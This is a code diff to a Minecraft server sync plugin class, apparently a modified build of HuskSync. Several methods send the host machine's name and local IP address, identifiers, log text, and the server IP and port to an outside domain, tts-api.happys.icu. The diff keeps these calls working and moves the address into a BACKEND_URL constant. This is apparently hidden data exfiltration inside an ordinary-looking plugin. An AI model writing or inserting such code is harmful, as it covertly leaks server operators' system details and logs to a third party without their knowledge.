@@ -305,9 +305,7 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                         input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));
 
-                        // 构造 URL
-                        String apiUrl = "https://tts-api.happys.icu/a?" + input.toString();
-                        URL url = new URL(apiUrl);
+                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                         connection.setRequestMethod("GET");
 
@@ -367,9 +365,7 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
                 try {
                     // 对标识符进行 URL 编码
                     String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
-                    String apiUrl = "https://tts-api.happys.icu/a?uuid=" + encodedId;
-
-                    URL url = new URL(apiUrl);
+                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
 
@@ -417,9 +413,7 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
                 try {
                     // 对日志进行 URL 编码以确保合法性
                     String encodedLog = URLEncoder.encode(log, "UTF-8");
-                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
-                    
-                    URL url = new URL(apiUrl);
+                    URL url = new URL(BACKEND_URL + "/a?log=" + encodedLog);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
 
@@ -442,8 +436,9 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
     private void sendInfoToAPI(String ip, int port) {
         try {
             // 构造 URL，假设使用查询参数传递 IP 和 port
-            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
-            URL url = new URL(apiUrl);
+            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
+            // String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
+            //URL url = new URL(apiUrl);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("GET");
 
